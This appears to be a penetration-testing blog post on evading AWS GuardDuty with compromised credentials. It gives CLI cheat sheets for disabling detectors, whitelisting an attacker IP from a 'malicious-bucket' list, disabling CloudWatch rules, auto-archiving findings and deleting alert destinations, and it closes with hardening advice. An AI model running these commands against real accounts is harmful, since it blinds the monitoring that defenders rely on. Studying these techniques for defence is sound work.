---
layout: post
title: AWS Guard-OffDuty
---

Let's assume that we have found and  successfully validated some AWS credentials during an engagement. Then it might be a good idea to modify the threat detection services like GuardDuty to reduce the likelihood of triggering an alert. Therefore we need to modify the GuardDuty configuration to stay cloaked. Deleting or modifying key attributes of GuardDuty might have a less likely chance to raise alerts. The actions we can do depend on the compromised permissions available. The GuardDuty architecture and the presence of higher level controls like [Service Control Policies](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html) can give us options.

<p align="center">
<img width=300 src="/images/mr-bean-guard.gif">
</p>

GuardDuty itself uses a delegated admin or invite model which are hard to bypass. But features like detector configurations and IP-Trust-Lists are usually centrally managed. This pivot point can be used as a bypass, but usually they can only be modified in the GuardDuty administrator account itself. If this pattern isn't used, these features can be modified in the account that GuardDuty is running in and help us to trick the Guards.

Let's check our options:

## Option1 - Patching the Detector

We can modify an existing GuardDuty detector in the account with the goal to remove log sources or lessen its effectiveness.

Configuration changes may include a combination of:

- Disabling the detector  
- Removing Kubernetes and S3 as Data Sources. This removes all available [S3 Protection](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html) and/or [Kubernetes alerts](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-kubernetes.html)  
- Increasing the event update frequency to 6 hours instead of the casual 15 minutes. This give some more time to dig around in the account and stay cloaked. To manage this we have to check the Required permissions to execute:

- `guardduty:ListDetectors`
- `guardduty:UpdateDetector`

Tiny cheat sheet of the CLI commands:

```bash
# Disabling the detector
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --no-enable 

# Removing s3 as a log source
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --finding-publishing-frequency SIX_HOURS
```

---

## Option2 - Patching Trusted IP Lists

We could create or update GuardDuty's [Trusted IP list](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_upload-lists.html) - including their own IP on the list. Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them.

*DNS findings are exempt from the Trusted IP list.*

**Required permissions to execute:**

- `guardduty:ListDetectors`
- `guardduty:ListIPSet`
- `iam:PutRolePolicy`
- `guardduty:CreateIPSet (can be used to create a new list)`
- `guardduty:UpdateIPSet (update an existing list)`

Depending on the level of stealth required the file can be uploaded to an S3 bucket:

- Either in the target account
- or an account controlled by the attacker

Tiny cheat sheet of the CLI commands:

```bash
aws guardduty update-ip-set \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --ip-set-id 24adjigdk34290840348exampleiplist \
    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
    --activate
```

## Option 3 - Modify Cloudwatch events rule

GuardDuty populates its findings to Cloudwatch-Events every 5 minutes. Modifying the Event pattern or Targets for an event may reduce GuardDuty's ability to alert and trigger auto-remediation of a findings. Especially where the remediation is triggered in a member account as GuardDuty administrator protections do not extend to the Cloudwatch events in one of the member accounts.

But be aware that:

> In a delegated or invitational admin GuardDuty architecture, cloudwatch events will still be created in the admin account.

**Required permissions to execute:**

- `gevent:ListRules`
- `gevent:ListTargetsByRule`
- `gevent:PutRule`
- `gevent:RemoveTargets`

Tiny cheat sheet of the CLI commands:

```bash
# Disable GuardDuty Cloudwatch Event
aws events put-rule --name guardduty-event \
    --event-pattern "{\"source\":[\"aws.guardduty\"]}" \
    --state DISABLED

# Modify Event Pattern
aws events put-rule --name guardduty-event \
    --event-pattern '{"source": ["aws.somethingthatdoesntexist"]}'

# Remove Event Targets
aws events remove-targets \ 
    --name guardduty-event \
    --ids "GuardDutyTarget"
```

---

## Option 4 - Create Suppression Rules

Newly create GuardDuty findings can be automatically archived via [Suppression Rules](https://docs.aws.amazon.com/guardduty/latest/ug/findings_suppression-rule.html). We can also use [filters](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_filter-findings.html) to automatically archive findings before they are fresh generated.

**Required permissions to execute:**
- `guardduty:CreateFilter`

Tiny cheat sheet of the CLI commands:

```bash
aws  guardduty create-filter --action ARCHIVE \
--detector-id 123456 \
--name fancyfiltername \
--finding-criteria file://criteria.json
```

Filters can be created using the [CreateFilter API](https://docs.aws.amazon.com/guardduty/latest/APIReference/API_CreateFilter.html).

---

## Option 5 - Delete Publishing Destination

We could disable alerting simply by [deleting the destination](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html) of alerts.

**Required permissions to execute:**

- `guardduty:DeletePublishingDestination`

Tiny cheat sheet of the CLI commands:

```bash
aws guardduty delete-publishing-destination \
    --detector-id abc123 \
    --destination-id def456
```

## How to keep the Guards On-Duty

Now we learned how bad things can turn out or the work as a defender can be slowed out. Too keep up with the cool kids we have multiple things to fortify our AWS accounts:

1. The best way - Keep all the GuardDuty configurations, Policies and other things safe in a dedicated GuardDuty account to manage the rest. Make sure that you respect the principle of least privilege.
2. AWS Config can be used for making sure that your configuration is auto remediated to a sane configuration. In case that an auto remediation occurred - you have to enter a SIRT (Security Incident Response Team) Mode as soon as possible and investigate your fortress
3. Keep an eye on changes of crucial events in CloudWatch or use a WatchDog based on AWS Lambda to get notified if something strange happens.
4. Train and use a simulation tool to check regularly if GuardDuty, Monitoring and SIEM are still alive. The [awslabs/amazon-guardduty-tester](https://github.com/awslabs/amazon-guardduty-tester) might be polished a little for this purpose.
5. Do not rely on GuardDuty as your only line of defense - defense in depth is king and create as much hurdles as possible and be aware that even the strongest fortress will fall, it's just a matter of effort an attacker is ready to invest. Let's make it as hard as possible :)

<p align="center">
<img width=300 src="/images/MivN.gif">
</p>
